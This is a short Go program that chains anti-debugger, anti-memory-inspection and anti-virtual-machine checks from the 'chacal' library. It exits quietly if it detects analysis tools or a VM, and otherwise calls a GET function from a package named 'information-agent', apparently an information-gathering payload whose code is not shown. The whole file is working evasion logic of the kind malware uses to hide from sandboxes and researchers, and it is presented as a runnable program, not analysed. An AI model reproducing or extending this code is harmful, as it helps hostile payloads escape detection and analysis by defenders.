package main

import (
	"fmt"
	"os"
	"github.com/coopersec/information-agent/utility"
	"github.com/p3tr0v/chacal/antidebug"
	"github.com/p3tr0v/chacal/antimem"
	"github.com/p3tr0v/chacal/antivm"
)

func main() {

	// VM Check
	if antidebug.ByProcessWatcher() { // Whether some debugger program founded, enter here.
		// exit or wait
		os.Exit(3)
	}
	if antimem.ByMemWatcher() { // Whether some program used for inspect memory founded, enter here.
		// exit or wait
		os.Exit(3)
	}
	if antivm.BySizeDisk(100) { // whether total disk size is less than 100 GB, enter here. You chose the size, always in GB.
		// exit or wait
		os.Exit(3)
	}
	if antivm.IsVirtualDisk() { // If Chacal guess you are on virtual disk, enter here.
		// exit or wait
		os.Exit(3)
	}
	if antivm.ByMacAddress() { // If Chacal guess you are on virtual MAC Address, enter here.
		// exit or wait
		os.Exit(3)
	}

	fmt.Println("Chacal: No suspicious activity detected.")
	utility.GET()
}
